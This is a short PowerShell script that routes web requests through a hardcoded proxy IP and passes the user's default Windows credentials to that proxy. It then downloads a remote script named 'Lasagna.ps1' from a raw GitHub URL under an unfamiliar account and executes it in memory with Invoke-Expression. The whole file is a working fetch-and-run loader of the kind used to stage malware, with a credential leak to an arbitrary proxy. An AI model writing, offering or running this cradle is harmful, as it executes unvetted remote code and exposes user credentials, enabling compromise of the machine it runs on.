# Set the proxy server information (replace with your proxy server details)
$proxyServer = "98.162.25.29:31679"

# Set the URL of the PowerShell script you want to run
$scriptURL = "https://raw.githubusercontent.com/MarkDenkmn/MarkDenkmn/main/Lasagna.ps1"

# Set the proxy settings for the current session
[system.net.webrequest]::defaultwebproxy = New-Object System.Net.WebProxy($proxyServer)
[system.net.webrequest]::defaultwebproxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials

# Download and run the script
$scriptContent = (New-Object System.Net.WebClient).DownloadString($scriptURL)
Invoke-Expression -Command $scriptContent

# Remove the proxy settings to avoid affecting other PowerShell sessions
[system.net.webrequest]::defaultwebproxy = $null
